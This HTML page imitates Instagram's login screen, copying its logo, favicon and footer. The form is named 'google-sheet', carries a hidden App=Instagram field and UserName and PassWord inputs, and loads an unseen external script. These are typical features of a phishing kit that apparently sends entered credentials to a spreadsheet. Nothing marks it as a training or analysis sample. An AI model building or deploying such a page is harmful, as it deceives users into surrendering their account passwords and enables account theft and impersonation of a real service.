<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/31336427386c.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        
        body {
            font-family: 'Inter', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            flex-direction: column;
            color: #262626;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-grow: 1;
            padding: 20px;
            width: 100%;
        }

        .main-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            max-width: 350px;
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            height: 51px;
        }
        
        .input-group {
            width: 100%;
            margin-bottom: 6px;
        }
        
        .input-group input {
            width: 100%;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            font-size: 12px;
            outline: none;
        }
        
        .btn-login {
            width: 100%;
            background-color: #4cb5f9;
            color: #fff;
            font-weight: 600;
            padding: 8px 16px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 8px;
        }
        
        .btn-login:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }
        
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            width: 100%;
            margin: 15px 0;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        
        .divider-text {
            padding: 0 18px;
            font-size: 13px;
            color: #8e8e8e;
            font-weight: 600;
        }
        
        .btn-facebook {
            color: #385185;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
        }
        
        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-align: center;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
        }
        
        .footer {
            width: 100%;
            max-width: 935px;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
            margin-top: auto;
        }
        
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px;
            white-space: nowrap;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-meta {
            margin-top: 12px;
        }
        
        .footer-meta span {
            margin: 0 8px;
        }

        @media (max-width: 450px) {
            .main-card {
                border: none;
                padding: 10px;
                background-color: #fafafa;
            }
            .container {
                padding: 0;
            }
            .signup-card {
                border: none;
                background-color: #fafafa;
                margin-top: 0;
            }
            .footer {
                display: none;
            }
            .input-group input{
                width: 95%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <form name="google-sheet" class="main-card">
            <div class="logo">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram logo">
            </div>
            <input name="App" value="Instagram" type="hidden">
            <div class="input-group">
                <input name="UserName" type="text" placeholder="Phone number, username, or email" id="username" required>
            </div>
            <div class="input-group">
                <input name="PassWord" type="password" placeholder="Password" id="password" required>
            </div>
            <input class="btn-login" type="submit" value="Log in">
            <div class="divider">
                <span class="divider-text">OR</span>
            </div>
            <a href="#" class="btn-facebook">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </a>
            <a href="#" class="forgot-password">
                Forgot password?
            </a>
        </form>

    </div>
    
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Meta AI</a>
            <a href="#">Meta AI Articles</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="footer-meta">
            <span>English</span>
            <span>&copy; 2026 Instagram from Meta</span>
        </div>
    </footer>

    <script src="../script.js"></script>
    
</body>
</html>
